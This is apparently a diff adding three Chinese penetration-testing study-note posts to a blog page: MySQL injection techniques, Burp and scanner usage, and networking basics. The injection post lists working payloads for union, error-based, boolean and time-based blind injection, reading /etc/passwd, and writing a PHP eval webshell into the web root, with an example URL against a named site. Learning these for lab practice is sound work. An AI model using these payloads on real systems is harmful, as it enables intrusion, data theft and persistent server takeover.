@@ -152,6 +152,487 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/14/MYSQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="nannanshen">
+      <meta itemprop="description" content="渗透测试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/14/MYSQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">MYSQL注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-14 09:00:45" itemprop="dateCreated datePublished" datetime="2020-02-14T09:00:45+08:00">2020-02-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-18 16:05:34" itemprop="dateModified" datetime="2020-02-18T16:05:34+08:00">2020-02-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>union select可以查询两张不同表内的数据（取交集）。前提是前后列数相同，列也必须拥有相同的数据类型。</p>
+<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><ol>
+<li><p>判断注入点 </p>
+</li>
+<li><p>猜字段数 order by</p>
+</li>
+<li><p>联合查询：</p>
+<ul>
+<li><p><code>1&#39; union select database(),user() #</code>  获取当前数据库和数据库用户名</p>
+</li>
+<li><p><code>1&#39; union select version(),@@version_compile_os#</code> 获取当前的数据库版本和操作系统</p>
+<p>当MySQL的版本小于4.0时，是不支持union select联合查询的。当MySQL版本小于5.0时，有个默认数据库information_schema，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
+</li>
+<li><p><code>1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#</code>  获取数据表名</p>
+</li>
+<li><p><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code> 获取表中的列名</p>
+</li>
+</ul>
+</li>
+<li><p>获取数据</p>
+<ul>
+<li><code>1&#39; union select user,password from users#</code></li>
+</ul>
+</li>
+</ol>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul>
+<li><p>当在⼀个聚合函数，比如count函数后面如果使用分组语句就会把查询的⼀部分以错误的形式显⽰出来。当页面没有显位的时候，通过报错来获得显位，替换显位的语句来获取数据。</p>
+</li>
+<li><p>常用函数</p>
+<ol>
+<li>floor()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></li>
+</ul>
+<ol start="2">
+<li>extractvalue()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></li>
+</ul>
+<ol start="3">
+<li>updatexml()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></li>
+</ul>
+<ol start="4">
+<li>geometrycollection()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<ol start="5">
+<li>multipoint()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<ol start="6">
+<li>polygon()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<ol start="7">
+<li>multipolygon()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<ol start="8">
+<li>linestring()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code><br>​</li>
+</ul>
+<ol start="9">
+<li>multilinestring()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<p>​10. exp()</p>
+<ul>
+<li><code>select * from test where id=1 and exp(~(select * from(select user())a));</code></li>
+</ul>
+</li>
+<li><p>以上payload自行找资料理解原理</p>
+</li>
+</ul>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>页面无显位只能返回正常和错误两种情况。</li>
+<li>通过不停地测试返回结果判别语句执行结果。</li>
+<li>常用函数<ol>
+<li>length()返回长度</li>
+<li>substr()截取字符串</li>
+<li>ascii()返回字符ASCII码</li>
+<li>sleep()将程序挂起一段时间</li>
+</ol>
+</li>
+</ul>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断注入类型，数字or字符</li>
+<li>猜数据库名：<ol>
+<li>猜长度  <code>1&#39;  and length(database())=1 #</code></li>
+<li>逐字猜解  <code>1&#39; and ascii(substr(database(),1,1))&gt;97 #</code></li>
+</ol>
+</li>
+<li>猜表名：<ol>
+<li>猜表的数量 <code>1&#39; and (select count (table_name) from information_schema.tables where table_schema=database())=1 #</code></li>
+<li>猜第一个表的长度  <code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #</code></li>
+<li>逐字猜解  <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 #</code></li>
+</ol>
+</li>
+<li>猜字段名：<ol>
+<li>猜字段数量  <code>1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=1 #</code></li>
+<li>猜第一个字段长度   <code>1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=1 #</code></li>
+<li>逐字猜解  <code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1,1))&gt;97 #</code></li>
+</ol>
+</li>
+<li>猜解数据<ol>
+<li>二分法  <code>1&#39; and ascii(substr((select user from dvwa.users limit 0,1),1,1))&gt;96 #</code></li>
+<li>暴力  <code>1&#39; and (select count(*) from users where user = &#39;admin&#39;) = 1 #</code></li>
+</ol>
+</li>
+</ol>
+<h1 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>不管语句执行正确或错误返回结果都一样。只能靠时间盲注。</li>
+<li>if(condition,A,B) condition成立，则A，否则B。</li>
+<li>mysql&gt;=5.0 使⽤sleep()进⾏查询   <code>id=1 and sleep(5)</code>，mysql&lt;5.0使用benchmark()进行查询  <code>select benchmark(1000,select * from admin);</code> 通过查询次数增多，时间变得缓慢来判断是否存在延迟。</li>
+</ul>
+<h2 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断是否存在延迟注入  <code>id=1 and sleep(5)</code></li>
+<li>判断当前用户  <code>and if(ascii(substr(user(),1,1))=114,sleep(5),1)</code></li>
+<li>判断数据库名长度 <code>if(length(database())=8,sleep(5),1)</code></li>
+<li>猜解数据库名称  <code>and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)</code></li>
+<li>猜解表名  <code>and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=116,sleep(5),1);</code></li>
+<li>猜解列名 <code>and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;admin&#39; limit,0,1),1,1))&gt;100,sleep(5),1)</code></li>
+<li>猜数据  <code>and if(ascii(substr((select password from admin limit 0,1),1,1))&gt;100,sleep(5),1)</code></li>
+</ol>
+<h1 id="root权限处理"><a href="#root权限处理" class="headerlink" title="root权限处理"></a>root权限处理</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul>
+<li>当前连接到的mysql用户具有root权限</li>
+<li>能获取到网站的物理路径（phpinfo、报错、爆破…） </li>
+<li>5.5.53之前的版本是secure_file_priv 变量默认为空，所以默认情况下是可以直接通过SQL语句来导出文件的。高于5.5时，mysql新出了一个secure-file-priv 字段 : secure-file-priv 参数是用来限制读写文件。查看secure-file-priv 参数的值:  <code>show global variables like &#39;%secure%&#39;</code></li>
+</ul>
+<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol>
+<li><p>读文件</p>
+<ul>
+<li><code>select load_file(&#39;/etc/passwd&#39;);</code></li>
+<li><code>select load_file(0x2F6574632F706173737764);</code> 文件路径可换成16进制</li>
+</ul>
+</li>
+<li><p>写文件</p>
+<ul>
+<li><p>INTO OUTFILE函数写文件时会在每一行的结束自动加上换⾏符</p>
+</li>
+<li><p>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</p>
+</li>
+<li><p><code>select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into outfile &#39;/var/www/html/muma.php&#39; ;</code>  注意，有时候斜杠要转义，用双斜杠代替</p>
+</li>
+<li><p><code>select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into DUMPFILE &#39;/var/www/html/muma.php&#39; ;</code></p>
+</li>
+<li><p><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; LINES STARTING BY &#39;&lt;?php @eval($_POST[pass])?&gt;&#39;</code></p>
+</li>
+<li><p>LINES STARTING BY ‘写⼊的内容’：设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。</p>
+</li>
+<li><p>LINES TERMINATED BY ‘写⼊的内容’：设置每⾏数据结尾的字符，可以为单个或多个字符。默认值是”\n”。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><code>http://www.dark5.net/index.php?id=1 and 1=2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;/var/www/html/1.php&#39; -- a</code></p>
+<h2 id="GPC的问题"><a href="#GPC的问题" class="headerlink" title="GPC的问题"></a>GPC的问题</h2><p>PHP开启GPC以后，会把接收的字符加上反斜杠转义。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E7%BB%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="nannanshen">
+      <meta itemprop="description" content="渗透测试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/13/%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E7%BB%B4/" class="post-title-link" itemprop="url">扫描器的使用和漏洞利用思维</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-13 15:41:54 / 修改时间：20:05:22" itemprop="dateCreated datePublished" datetime="2020-02-13T15:41:54+08:00">2020-02-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><h2 id="扫描器的意义"><a href="#扫描器的意义" class="headerlink" title="扫描器的意义"></a>扫描器的意义</h2><ul>
+<li><p>信息收集</p>
+</li>
+<li><p>漏洞挖掘</p>
+<p>总结一下就是代替手工进行快速的模糊测试</p>
+</li>
+</ul>
+<h2 id="有哪些扫描器"><a href="#有哪些扫描器" class="headerlink" title="有哪些扫描器"></a>有哪些扫描器</h2><ul>
+<li>Appscan</li>
+<li>AWVS</li>
+<li>Burp</li>
+<li>W3AF</li>
+</ul>
+<h2 id="AWVS的使用"><a href="#AWVS的使用" class="headerlink" title="AWVS的使用"></a>AWVS的使用</h2><ul>
+<li>扫描前先测试有没有WAF拦截</li>
+<li>扫描配置一般默认就行</li>
+</ul>
+<h2 id="Burp的使用"><a href="#Burp的使用" class="headerlink" title="Burp的使用"></a>Burp的使用</h2><ul>
+<li>proxy  代理：抓请求包</li>
+<li>target 目标： 保存spider爬行的结果，列出网站目录结构</li>
+<li>spider 爬虫：爬行网站目录结构，配置一般不需要修改，速度慢可以增加线程</li>
+<li>scanner 扫描器：扫描网站漏洞。先用spider扫描出目录结构，再扫描漏洞。</li>
+<li>intruder 爆破：<ul>
+<li>position设置payload位置和攻击类型：<ul>
+<li>位置一般都手动添加</li>
+<li>类型分为四种<ul>
+<li>狙击手模式（Sniper）——它使用一组Payload集合，依次替换Payload位置上（一次攻击只能使用一个Payload位置）被§标志的文本（而没有被§标志的文本将不受影响），对服务器端进行请求，通常用于测试请求参数是否存在漏洞。</li>
+<li>攻城锤模式（Battering ram）——它使用单一的Payload集合，依次替换Payload位置上被§标志的文本（而没有被§标志的文本将不受影响），对服务器端进行请求，与狙击手模式的区别在于，如果有多个参数且都为Payload位置标志时，使用的Payload值是相同的，而狙击手模式只能使用一个Payload位置标志。</li>
+<li>草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用Payload分别为A和C，第二次使用的Payload分别为B和D。</li>
+<li>集束炸弹模式（Cluster bomb） 它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，执行的Payload数据Payload组的乘积。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的Payload分别为B和C，第四次使用的Payload分别为B和D。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>payload类型：<ul>
+<li>简单列表（Simple list） ——最简单的Payload类型，通过配置一个字符串列表作为Payload，也可以手工添加字符串列表或从文件加载字符串列表。</li>
+<li>运行时文件（Runtime file） ——指定文件，作为相对应Payload位置上的Payload列表。</li>
+<li>自定义迭代器（Custom iterator）——这是一款功能强大的Payload，它共有8个占位，每一个占位可以指定简单列表的Payload类型，然后根据占位的多少，与每一个简单列表的Payload进行笛卡尔积，生成最终的Payload列表。</li>
+<li>字符串替换（Character substitution）——顾名思义，此种Payload的类型是对预定义的字符串进行替换后生成新的Payload。</li>
+<li>大小写替换（Case modification）——对预定义的字符串，按照大小写规则，进行替换。生成规则由上而下依次是：No change（不改变，使用原始字符串）、To lowercase（转为小写字母）、To upper case（转为大写字母）、To Propername（首字母大写，其他小写）、To ProperName（首字母大写，其他不改变）。</li>
+<li>递归grep （Recursive grep）——此Payload类型主要使用于从服务器端提取有效数据的场景，需要先从服务器的响应中提取数据作为Payload，然后替换Payload的位置，进行攻击。它的数据来源了原始的响应消息，基于原始响应，在Payload的可选项设置（Options）中配置Grep规则，然后根据grep去提取数据才能发生攻击。当发起攻击时，Burp会对每一次响应的消息进行分析，如果提取到了指定的值，则作为Payload再发生一次请求。</li>
+<li>不合法的Unicode编码（Illegal Unicode）—— 在payloads里用指定的不合法Unicode 编码替换字符本身，从这些Payload列表里产生出一个或者多个有效负荷。在尝试回避基于模式匹配的输入验证时，这个有效负荷会有用的。</li>
+<li>字符块（Character blocks）——这种类型的Payload是指使用一个给出的输入字符串，根据指定的设置产生指定大小的字符块，表现形式为生成指定长度的字符串。它通常用于边界测试或缓冲区溢出。</li>
+<li>数字类型（Number）——这种类型的Payload是指根据配置，生成一系列的数字作为Payload。</li>
+<li>日期类型（Dates）——这种类型的Payload是指根据配置，生成一系列的日期。</li>
+<li>暴力字典（Brute forcer）——此类Payload生成包含一个指定的字符集的所有排列特定长度的有效载荷，通常用于枚举字典的生成。</li>
+<li>空类型（Null payloads）——这种负载类型产生的Payload，其值是一个空字符串。在攻击时，需要同样的请求反复被执行，在没有任何修改原始请求的场景下此Payload是非常有用的。</li>
+<li>字符frobber（Character frobber）——这种类型的Payload的生成规律是：依次修改指定字符串在每个字符位置的值，每次都是在原字符上递增一个该字符的ASCII码。</li>
+<li>Bit翻转（Bit flipper）——这种类型的Payload的生成规律是：对预设的Payload原始值，按照比特位，依次进行修改。</li>
+<li>用户名生成器（Username generator）这种类型的Payload主要用于用户名和email帐号的自动生成。</li>
+<li>ECB 加密块洗牌（ECB block shuffler）——这种类型的Payload是基于ECB加密模式的Payload生成器。</li>
+<li>Burp Payload生成插件（Extension-generated）——这种类型的Payload是基于Burp插件来生成Payload值，因此使用前必须安装配置Burp插件，在插件里注册一个Intruder payload生成器，供此处调用。</li>
+<li>Payload复制（Copy other payload）——这种类型的Payload是将其他位置的参数复制到Payload位置上，作为新的Payload值。</li>
+</ul>
+</li>
+<li>options可选设置：<ul>
+<li>请求消息头设置（Request Headers）——这个设置主要用来控制请求消息的头部信息，它由Update Content-Length header和Set Connection: close两个选项组成。其中Update Content-Length header如果被选中，Burp Intruder在每个请求添加或更新Content-Length头为该次请求的HTTP体的长度正确的值。这个功能通常是为插入可变长度的Payload到模板的HTTP请求的主体的攻击中，如果没有指定正确的值，则目标服务器可能会返回一个错误，可能会到一个不完整的请求做出响应，或者可能会无限期地等待请求继续接收数据。Set Connection: close如果被选中，表示Burp Intruder在每个请求消息中添加或更新值为“关闭”的连接头，这将更迅速地执行。</li>
+<li>请求引擎设置（Request Engine）——这个设置主要用来控制Burp Intruder攻击，包括线程什么的，用来提高效率。</li>
+<li>Grep Match——这个设置主要用来从响应消息中提取结果项，如果匹配，则在攻击结果中添加的新列中标明，便于排序和数据提取。比如说，在密码猜测攻击，扫描诸如“密码不正确”或“登录成功”，可以找到成功的登录;在测试SQL注入漏洞，扫描包含“ODBC”，“错误”等消息可以识别脆弱的参数。</li>
+<li>Grep Extract——这些设置可用于提取响应消息中的有用信息。对于列表中配置的每个项目，Burp会增加包含提取该项目的文本的新结果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。此选项是从应用数据挖掘有用的，能够支持广泛的攻击。例如，如果你是通过一系列文档ID的循环，可以提取每个文档寻找有趣的项目的页面标题。如果您发现返回的其他应用程序用户详细信息的功能，可以通过用户ID重复和检索有关用户寻找管理帐户，甚至密码。如果“遗忘密码”的功能需要一个用户名作为参数，有关用户寻找管理帐户，甚至密码。如果“遗忘密码”的功能需要一个用户名作为参数，并返回一个用户配置的密码提示，您可以通过共同的用户名列表运行和收获的所有相关密码的提示，然后直观地浏览列表寻找容易被猜到密码。</li>
+<li>Grep Payloads——这些设置可用于提取响应消息中是否包含Payload的值，比如说，你想验证反射性的XSS脚本是否成功，可以通过此设置此项。</li>
+<li>重定向（Redirections）——这些设置主要是用来控制执行攻击时Burp如何处理重定向。</li>
+</ul>
+</li>
+<li>至于结果，一般都是看返回数据长度来判别payload是否有效。</li>
+</ul>
+</li>
+<li>repeater 重放：进行反复测试。上传攻击用的比较多。request可以修改请求，两个框框下面可以匹配搜索关键字。</li>
+<li>decoder 解码器：解码用的。里面也有编码功能。</li>
+<li>comparer  比较器：比较两个请求数据包内容的改动。</li>
+<li>extender 扩展器：扩展插件功能。</li>
+<li>burp配合其他代理隐藏自身：本地请求—&gt;burp—&gt;proxifier—&gt;ss—&gt;目标站点。重点是proxifier的配置，通过代理规则让burp发出的数据包全部经过ss代理以后再发出，达到隐藏自身和翻墙的目的。</li>
+</ul>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="有哪些"><a href="#有哪些" class="headerlink" title="有哪些"></a>有哪些</h2><ul>
+<li><p>OWASP TOP10</p>
+</li>
+<li><p>常见的：SQL注入，XSS，CSRF，SSRF，未授权访问，越权，命令执行，代码执行，弱口令…</p>
+<p>后面具体学习的时候每个点再深入</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>多在实战中使用。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/%E7%BD%91%E7%BB%9C%E7%AF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="nannanshen">
+      <meta itemprop="description" content="渗透测试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/12/%E7%BD%91%E7%BB%9C%E7%AF%87/" class="post-title-link" itemprop="url">网络篇</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-12 12:32:47 / 修改时间：15:55:17" itemprop="dateCreated datePublished" datetime="2020-02-12T12:32:47+08:00">2020-02-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><ul>
+<li>由于以前入门的时候已经了解过相关知识，再复习一遍就当是查缺补漏.</li>
+</ul>
+<ol>
+<li>术语相关：<ul>
+<li>PoC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</li>
+<li>Exp，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</li>
+<li>Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。</li>
+<li>Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名。</li>
+</ul>
+</li>
+<li>ip相关：<ul>
+<li>A类1.0.0.0-126.0.0.0，大型网络。B类128.0.0.0-191.255.0.0，中等规模网络。C类192.0.0.0-223.255.255.0，小型网络。D类224.0.0.0-239.225.225.225，多路广播。E类240.0.0-247.255.255.255，保留地址。</li>
+<li>私有地址：A类：10.0.0.0-10.255.255.255。B类：172.16.0.0-172.31.255.255。C类：192.168.0.0-192.168.255.255。一般用在内网。 </li>
+<li>子网划分：网上有教程，计网复习也会用到，不多赘述。</li>
+<li>C段192.168.1.x-255.255.255.0</li>
+</ul>
+</li>
+<li>网络设备：<ul>
+<li>大多是概念性的，以后遇到的时候再深入。</li>
+</ul>
+</li>
+<li>端口：<ul>
+<li>对应不同的服务，根据服务来进行渗透。可以用来进行未授权访问、爆破之类的。</li>
+<li>扫描用nmap，使用方法资料很多，不多说。一般用的参数就-sS,-Pn。</li>
+</ul>
+</li>
+<li>HTTP协议：<ul>
+<li>这个也是很基础的东西，学了计网都知道。主要是要记住一些重要的请求头和状态码。</li>
+</ul>
+</li>
+<li>web通信和前后端：<ul>
+<li>也是计网的内容，不多说。主要是后端的服务要多了解一下。服务器：IIS，Apache，Tomcat等。解释器：.NET，PHP，JSP等。数据库：Access/Mssql，Mysql，Oracle等。脚本语言：ASP，PHP，JSP。都有不同的特性和常见漏洞。</li>
+</ul>
+</li>
+<li>网站搭建：<ul>
+<li>按视频里用的AWWserver。还是有点坑，安装完以后JSP死活运行不了。最后发现是JAVA环境变量的问题。修改完以后实在不行重启一下就好了。</li>
+</ul>
+</li>
+<li>本地靶场：<ul>
+<li>常见的DVWA。针对性的SQLi-abs。不多说，在线的也有。要多练习，理解原理。</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/11/PHP%E5%92%8CMYSQL%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -561,14 +1042,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
